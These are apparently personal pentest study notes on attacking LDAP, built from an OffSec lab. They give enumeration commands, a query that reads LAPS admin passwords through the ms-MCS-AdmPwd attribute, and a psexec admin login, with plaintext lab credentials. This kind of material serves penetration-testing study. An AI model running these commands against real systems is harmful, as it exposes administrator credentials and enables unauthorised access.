# LDAP (389)

---

> https://book.hacktricks.xyz/pentesting/pentesting-ldap

### 1) LDAP Enumeration

Basic enumeration:
- `nmap -n -sV --script "ldap* and not brute" <ip>`
- `ldapsearch -x -h <IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"` 

Username and description enumeration:
- you can use the naming context found (the DC name) to search for users by grepping by SAM account name 
- i.e. `ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:`
- from here you can see if there is any information tied to the accounts found through their "description" 
- i.e. `ldapsearch -x -h 192.168.189.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description` 
- this may reveal default passwords


<br>

--- 

### 2) LDAP Exploitation

Searching for admin passwords:
- if LAPS or LDAP is misconfigured then you may be able to find admin passwords for using previously discovered LDAP credentials by looking for the `_ms-Mcs-AdmPwd` attribute
- i.e. `ldapsearch -x -h 192.168.64.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
- then yuo can use this to login to system using `impacket-psexec` 
- i.e `impacket-psexec hutch.offsec/administrator:'FDpB+O-Pq8UlY5'@192.168.189.122`




